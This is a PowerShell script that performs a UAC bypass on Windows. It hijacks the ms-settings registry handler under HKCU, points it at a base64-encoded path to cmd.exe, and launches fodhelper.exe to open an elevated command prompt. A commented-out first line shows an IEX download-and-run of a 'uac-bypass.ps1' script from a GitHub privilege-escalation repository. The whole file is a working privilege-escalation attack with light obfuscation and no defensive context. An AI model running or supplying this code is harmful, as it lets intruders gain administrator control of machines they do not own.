#IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/uac-bypass.ps1")

# Define the registry key path
$REG_KEY = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"

# Base64 encoded filename - you need to encode filename
$BASE64_ENCODED_PATH = "Yzpcd2luZG93c1xzeXN0ZW0zMlxjbWQuZXhl"

# Decode the base64 string to get the file path
$RUN123 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($BASE64_ENCODED_PATH))

# Pause for 2 seconds
Start-Sleep -Seconds 2

# Ensure that the registry path exists; if not, create it with a confirmation check
if (!(Test-Path $REG_KEY)) {
    try {
        # Attempt to create the registry path
        New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Name "command" -Force | Out-Null
        Start-Sleep -Seconds 1  # Short delay to ensure the key is created
    } catch {
        Write-Host "Error: Unable to create registry key path. Exiting." -ForegroundColor Red
        exit
    }
}

# Verify creation of the registry path before proceeding
if (Test-Path $REG_KEY) {
    # Add the DelegateExecute registry value with an empty string
    Set-ItemProperty -Path $REG_KEY -Name "DelegateExecute" -Value "" -Force

    # Pause for 4 seconds
    Start-Sleep -Seconds 4

    # Add the command to run the decoded executable as the default command
    Set-ItemProperty -Path $REG_KEY -Name "(Default)" -Value $RUN123 -Force

    # Pause for 2 seconds
    Start-Sleep -Seconds 1

    # Execute fodhelper.exe, effectively running the command as admin
    Start-Process "fodhelper.exe"
} else {
    Write-Host "Error: Registry path could not be created or accessed. Exiting." -ForegroundColor Red
    exit
}



